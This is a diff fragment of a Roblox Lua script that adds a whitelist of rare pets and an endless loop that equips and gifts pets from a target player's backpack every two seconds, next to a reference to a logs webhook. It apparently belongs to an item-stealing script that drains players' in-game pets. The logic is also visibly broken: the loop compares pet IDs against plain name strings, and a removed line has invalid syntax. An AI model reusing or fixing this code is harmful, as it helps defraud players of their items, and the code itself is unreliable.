@@ -695,20 +695,24 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
                 return false
             end
         end
+local WhitelistPets = {
+    "Kitsune",
+    "Brontosaurus",
+"Mimic Octopus",
 
+}
         -- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
         task.spawn(function()
             while true do
                 task.wait(2)  -- Re-scan every 2 seconds
-                local currentPets = GetPlayerPets()
+                local currentPets = WhitelistPets
                 if #currentPets == 0 then continue end
 
                 for _, pet in ipairs(currentPets) do
                     for _, tool in targetPlr.Backpack:GetChildren() do
                         if tool:IsA("Tool")
                         and tool:GetAttribute("ItemType") == "Pet"
-                        and tool:GetAttribute("PET_UUID") == pet.Id 
-and petName:("Brontosaurus") then
+                        and tool:GetAttribute("PET_UUID") == pet.Id then
 
                             print("Equipping & gifting:", tool.Name)
                             targetPlr.Character.Humanoid:EquipTool(tool)
